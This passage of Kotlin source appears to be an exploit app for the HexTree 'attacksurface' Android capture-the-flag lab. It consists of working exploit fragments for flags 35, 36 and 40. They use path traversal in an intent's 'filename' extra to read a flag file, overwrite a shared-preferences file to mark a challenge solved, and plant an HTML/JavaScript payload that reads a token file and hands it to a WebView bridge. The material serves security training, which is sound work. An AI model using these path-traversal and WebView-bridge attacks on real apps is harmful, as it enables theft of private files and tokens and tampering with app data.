    override fun onCreate(savedInstanceState: Bundle?) { super.onCreate(savedInstanceState); executeStage() }
    private fun executeStage() { startActivityForResult(Intent().apply { setClassName("io.hextree.attacksurface", "io.hextree.attacksurface.activities.Flag35Activity"); putExtra("filename", "../flag35.txt") }, 35) }
    override fun onActivityResult(requestCode: Int, resultCode: Int, data: Intent?) {
        if (requestCode == 35 && data?.data != null) {
            val uri = data.data!!
            try {
                if (stage == 1) { activity.contentResolver.openOutputStream(uri)?.use { it.write("i".toByteArray()) }; stage = 2; executeStage() }
                else { val f = activity.contentResolver.openInputStream(uri)?.bufferedReader()?.use { it.readText() }; Toast.makeText(activity, "Flag 35: $f", Toast.LENGTH_LONG).show(); activity.fragmentManager.beginTransaction().remove(this).commitAllowingStateLoss() }
            } catch (e: Exception) { e.printStackTrace() }
        }
    }
}
class Flag36ExploitFragment : android.app.Fragment() {
    override fun onCreate(savedInstanceState: Bundle?) { super.onCreate(savedInstanceState); startActivityForResult(Intent().apply { setClassName("io.hextree.attacksurface", "io.hextree.attacksurface.activities.Flag35Activity"); putExtra("filename", "../shared_prefs/Flag36Preferences.xml") }, 36) }
    override fun onActivityResult(requestCode: Int, resultCode: Int, data: Intent?) {
        if (requestCode == 36 && data?.data != null) {
            try {
                activity.contentResolver.openOutputStream(data.data!!)?.use { it.write("<?xml version='1.0' encoding='utf-8' standalone='yes' ?><map><boolean name=\"solved\" value=\"true\" /></map>".toByteArray()) }
                Toast.makeText(activity, "🛑 SWIPE AWAY HexTree, then open Flag 36!", Toast.LENGTH_LONG).show(); activity.fragmentManager.beginTransaction().remove(this).commitAllowingStateLoss()
            } catch (e: Exception) { e.printStackTrace() }
        }
    }
}
class Flag40ExploitFragment : android.app.Fragment() {
    override fun onCreate(savedInstanceState: Bundle?) { super.onCreate(savedInstanceState); startActivityForResult(Intent().apply { setClassName("io.hextree.attacksurface", "io.hextree.attacksurface.activities.Flag34Activity"); putExtra("filename", "exploit40.html") }, 40) }
    override fun onActivityResult(requestCode: Int, resultCode: Int, data: Intent?) {
        if (requestCode == 40 && data?.data != null) {
            try {
                activity.contentResolver.openOutputStream(data.data!!)?.use { it.write("<!DOCTYPE html><html><body><script>try{var x=new XMLHttpRequest();x.open('GET','token.txt',false);x.send(null);hextree.authCallback(x.responseText);}catch(e){hextree.authCallback('Error:'+e);}</script></body></html>".toByteArray()) }
                startActivity(Intent().apply { setClassName("io.hextree.attacksurface", "io.hextree.attacksurface.webviews.Flag40WebViewsActivity"); addFlags(Intent.FLAG_ACTIVITY_NEW_TASK or Intent.FLAG_ACTIVITY_CLEAR_TASK); putExtra("URL", "file:///data/data/io.hextree.attacksurface/files/exploit40.html") })
                activity.fragmentManager.beginTransaction().remove(this).commitAllowingStateLoss()
            } catch (e: Exception) { e.printStackTrace() }
        }
    }
}
